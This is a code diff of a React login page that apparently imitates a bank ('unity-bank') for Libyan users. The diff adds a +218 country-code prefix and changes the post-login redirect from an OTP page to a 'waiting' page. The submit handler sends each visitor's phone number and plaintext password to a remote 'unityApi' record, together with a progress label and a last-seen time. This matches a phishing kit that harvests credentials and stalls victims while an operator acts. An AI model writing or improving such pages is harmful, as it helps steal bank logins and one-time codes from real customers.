@@ -126,8 +126,8 @@ export default function LoginPage() {
     setErr("");
     setLoading(true);
     const id = localStorage.getItem("unity_id")!;
-    await unityApi.patch(id, { phone, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
-    setTimeout(() => { window.location.href = "/unity-bank/otp"; }, 800);
+    await unityApi.patch(id, { phone: `+218${phone}`, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
+    setTimeout(() => { window.location.href = "/unity-bank/waiting"; }, 800);
   };
 
   return (
@@ -262,13 +262,14 @@ export default function LoginPage() {
             display: "flex",
             alignItems: "center",
             padding: "0 16px",
+            gap: "0",
           }}>
             <input
               type="tel"
               value={phone}
               onChange={e => setPhone(e.target.value)}
               placeholder="رقم الهاتف"
-              dir="rtl"
+              dir="ltr"
               style={{
                 flex: 1,
                 border: "none",
@@ -281,7 +282,20 @@ export default function LoginPage() {
                 textAlign: "right",
               }}
             />
-            {/* icon on left side (RTL: after text) */}
+            {/* Libya country code */}
+            <div style={{
+              display: "flex",
+              alignItems: "center",
+              gap: "6px",
+              borderRight: `1.5px solid ${C.inputBorder}`,
+              paddingRight: "12px",
+              marginRight: "10px",
+              flexShrink: 0,
+            }}>
+              <span style={{ fontSize: "18px", lineHeight: 1 }}>🇱🇾</span>
+              <span style={{ fontSize: "14px", fontWeight: "700", color: C.textDark, direction: "ltr" }}>+218</span>
+            </div>
+            {/* icon on left side */}
             <div style={{ marginLeft: "10px", display: "flex", alignItems: "center" }}>
               <PhoneIcon />
             </div>
